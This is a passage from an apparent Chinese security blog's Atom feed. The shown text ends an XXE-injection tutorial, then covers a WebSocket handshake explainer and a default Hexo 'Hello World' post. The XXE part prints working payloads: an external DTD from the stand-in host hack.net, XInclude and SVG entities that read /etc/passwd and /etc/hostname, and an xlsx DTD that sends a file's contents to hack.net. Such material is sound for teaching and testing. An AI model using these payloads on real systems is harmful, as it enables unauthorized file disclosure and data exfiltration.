class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&quot;http://hack.net/hack.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><ul><li>数据在服务器端拼接进XML文档</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Apache-POI"><a href="#Apache-POI" class="headerlink" title="Apache POI"></a>Apache POI</h3><ul><li>文件上传xlsx文档</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># xxe.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://hack.net/?%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># [Content_Types].xml</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://hack.net/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ZIP压缩后改后缀为<code>xlsx</code></p><h3 id="Apache-Batik"><a href="#Apache-Batik" class="headerlink" title="Apache Batik"></a>Apache Batik</h3><ul><li>文件上传SVG头像</li></ul><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;XML基础&quot;&gt;&lt;a href=&quot;#XML基础&quot; class=&quot;headerlink&quot; title=&quot;XML基础&quot;&gt;&lt;/a&gt;XML基础&lt;/h2&gt;&lt;p&gt;XML是一种被设计用来存储和传输数据的语言，叫作&lt;em&gt;可扩展标记语言&lt;/em&gt;，通过自定义标签的形式描述数据。&lt;/</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="xml" scheme="https://hosch3n.github.io/tags/xml/"/>
    
    <category term="xxe" scheme="https://hosch3n.github.io/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>建立WebSocket连接</title>
    <link href="https://hosch3n.github.io/2020/08/16/%E5%BB%BA%E7%AB%8BWebSocket%E8%BF%9E%E6%8E%A5/"/>
    <id>https://hosch3n.github.io/2020/08/16/%E5%BB%BA%E7%AB%8BWebSocket%E8%BF%9E%E6%8E%A5/</id>
    <published>2020-08-16T12:33:06.000Z</published>
    <updated>2021-03-01T09:42:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>WebSocket是一种双向全双工的应用层协议，通常用在要求低延迟或需要服务器主动发送请求的地方。WSS与WS就像HTTPS与HTTP的关系一样，多了TLS加密层。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;wss://xxx.com/func&quot;</span>);</span><br></pre></td></tr></table></figure><p>首次建立WS连接时会通过HTTP协议握手协商：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/func</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.com</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive, Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span>: websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span>: 13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span>: QKVMhgEVGz7jTFD5PIizrQ==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">101</span> Switching Protocol</span><br><span class="line"><span class="attribute">Connection</span>: Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span>: websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span>: GUgfO45/U2Oo5uUkpUR3jnm3zcA=</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>Connection</code>与<code>Upgrade</code>表明这是WS握手，<code>Sec-WebSocket-Version</code>表示客户端希望使用的版本，<code>Sec-WebSocket-Key</code>为随机产生的Base64编码，<code>Sec-WebSocket-Accept</code>会响应该随机值的哈希。</p><p>握手成功后便可基于WS协议传输任意格式的数据，常用JSON：<code>ws.send(&#123;&quot;a&quot;: 1&#125;);</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;WebSocket是一种双向全双工的应用层协议，通常用在要求低延迟或需要服务器主动发送请求的地方。WSS与WS就像HTTPS与HTTP的关系一样，多了TLS加密层。&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ws" scheme="https://hosch3n.github.io/tags/ws/"/>
    
    <category term="js" scheme="https://hosch3n.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://hosch3n.github.io/2020/08/16/hello-world/"/>
    <id>https://hosch3n.github.io/2020/08/16/hello-world/</id>
    <published>2020-08-15T16:00:00.000Z</published>
    <updated>2021-01-10T10:01:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="Addition-modules"><a href="#Addition-modules" class="headerlink" title="Addition modules"></a>Addition modules</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-scss --save</span><br><span class="line">npm install hexo-renderer-swig --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br><span class="line">hexo new page categories</span><br><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
